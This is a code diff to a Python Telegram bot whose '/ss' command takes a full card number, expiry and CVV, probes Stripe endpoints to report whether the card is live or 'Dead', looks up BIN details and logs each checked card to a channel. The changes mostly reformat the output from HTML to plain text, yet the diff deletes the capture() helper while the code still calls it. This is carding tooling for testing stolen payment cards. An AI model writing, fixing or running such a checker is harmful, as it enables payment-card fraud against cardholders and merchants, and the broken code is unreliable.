@@ -707,7 +707,6 @@ async def stripe_checker(cc, mes, ano, cvv, user_id, firstname):
             'Referer': 'https://m.stripe.network/inner.html'
         }
         
-        # First request to get tokens
         res1 = session.get('https://m.stripe.com/6', headers=headers)
         muid = capture(res1.text, '"muid":"', '"')
         sid = capture(res1.text, '"sid":"', '"')
@@ -715,7 +714,7 @@ async def stripe_checker(cc, mes, ano, cvv, user_id, firstname):
         
         # Get BIN info
         bin_code = cc[:6]
-        bin_info = get_bin_info(bin_code)
+        brand, bank, country = get_bin_info(bin_code)
         
         # Prepare payment method request
         headers = {
@@ -786,22 +785,21 @@ async def stripe_checker(cc, mes, ano, cvv, user_id, firstname):
                 status = "Dead ❌"
                 response = error_code if error_code else "Declined"
         
-        # Prepare response
+        # Prepare plain text response (no HTML/Markdown)
         result_text = (
-            f"<b>Card:</b> <code>{cc}|{mes}|{ano}|{cvv}</code>\n"
-            f"<b>Status -» {status}\n"
-            f"Response -» {response}\n"
-            f"Gateway -» Stripe Auth 1\n"
-            f"Time -» <b>{elapsed:.2f}</b><b>s</b>\n\n"
-            f"------- Bin Info -------</b>\n"
-            f"<b>Bank -»</b> {bin_info[1]}\n"
-            f"<b>Brand -»</b> {bin_info[0]}\n"
-            f"<b>Type -»</b> {bin_info[2]}\n"
-            f"<b>Currency -»</b> USD\n"
-            f"<b>Country -»</b> {bin_info[3]}\n"
-            f"<b>----------------------------</b>\n\n"
-            f"<b>Checked By <a href='tg://user?id={user_id}'>{firstname}</a></b>\n"
-            f"<b>Bot By: <a href='t.me/andr0idpie9'>ANDROID PIE</a></b>"
+            f"Card: {cc}|{mes}|{ano}|{cvv}\n"
+            f"Status: {status}\n"
+            f"Response: {response}\n"
+            f"Gateway: Stripe Auth 1\n"
+            f"Time: {elapsed:.2f}s\n\n"
+            f"------- Bin Info -------\n"
+            f"Bank: {bank}\n"
+            f"Brand: {brand}\n"
+            f"Type: {country.split()[1] if len(country.split()) > 1 else 'N/A'}\n"
+            f"Country: {country}\n"
+            f"----------------------------\n\n"
+            f"Checked By: {firstname} (ID: {user_id})\n"
+            f"Bot By: ANDROID PIE (@andr0idpie9)"
         )
         
         return result_text
@@ -810,27 +808,16 @@ async def stripe_checker(cc, mes, ano, cvv, user_id, firstname):
         logging.error(f"Stripe checker error: {e}")
         return f"Error processing card: {str(e)}"
 
-def capture(text, start, end):
-    try:
-        return text.split(start)[1].split(end)[0]
-    except:
-        return ""
-
-def random_string(length):
-    return ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(length))
-
 @app.on_message(filters.command("ss", prefixes="/"))
 async def ss_handler(client: Client, message: Message):
     try:
-        # Check if user provided CC
         if len(message.text.split()) < 2:
-            await message.reply("<b>Please provide a CC to check in format: /ss 4111111111111111|12|25|123</b>", parse_mode="html")
+            await message.reply("Please provide a CC to check in format: /ss 4111111111111111|12|25|123")
             return
         
-        # Parse CC details
         lista = message.text.split()[1]
         if not re.match(r"\d{16}\|\d{2}\|\d{2,4}\|\d{3}", lista):
-            await message.reply("<b>Invalid CC format. Use: /ss 4111111111111111|12|25|123</b>", parse_mode="html")
+            await message.reply("Invalid CC format. Use: /ss 4111111111111111|12|25|123")
             return
             
         parts = lista.split("|")
@@ -839,16 +826,10 @@ async def ss_handler(client: Client, message: Message):
         ano = parts[2]
         cvv = parts[3]
         
-        # Send initial processing message
-        proc_msg = await message.reply("<b>Wait for Result...</b>", parse_mode="html")
-        
-        # Perform the check
+        proc_msg = await message.reply("Wait for Result...")
         result = await stripe_checker(cc, mes, ano, cvv, message.from_user.id, message.from_user.first_name)
         
-        # Edit message with result
-        await proc_msg.edit(result, parse_mode="html", disable_web_page_preview=True)
-        
-        # Log to channel
+        await proc_msg.edit(result)
         await log_to_channel(
             client, 
             "CC", 
@@ -859,8 +840,8 @@ async def ss_handler(client: Client, message: Message):
         
     except Exception as e:
         logging.error(f"SS handler error: {e}")
-        await message.reply(f"Error processing request: {str(e)}")            
-        
+        await message.reply(f"Error processing request: {str(e)}")        
+               
 if __name__ == "__main__":
     print("🚀 Combined Bot is running with /ai, /chk and /gen commands...")
     loop = asyncio.get_event_loop()
